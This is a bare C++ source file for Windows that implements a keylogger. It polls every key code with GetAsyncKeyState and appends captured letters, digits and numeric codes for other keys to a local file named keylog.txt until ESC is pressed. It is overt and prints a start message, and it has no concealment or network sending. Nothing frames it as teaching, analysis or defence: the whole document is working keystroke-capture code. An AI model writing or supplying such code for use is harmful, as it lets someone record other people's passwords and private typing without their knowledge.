#include <iostream>
#include <fstream>
#include <windows.h>

using namespace std;

bool isKeyPressed(int key) {
    return GetAsyncKeyState(key) & 0x8000;
}

int main() {
    ofstream logFile("keylog.txt", ios::app);
    if (!logFile.is_open()) {
        cerr << "Failed to open file." << endl;
        return 1;
    }

    cout << "Logging started. Press ESC to stop." << endl;

    while (true) {
        for (int key = 8; key <= 255; key++) {
            if (isKeyPressed(key)) {
                if (key == VK_ESCAPE) {
                    logFile.close();
                    return 0;
                }

                if ((key >= 'A' && key <= 'Z') || (key >= '0' && key <= '9')) {
                    logFile << char(key);
                } else {
                    logFile << " [" << key << "] ";
                }

                logFile.flush();
                Sleep(50);  // Prevent repeated fast logging
            }
        }
    }
}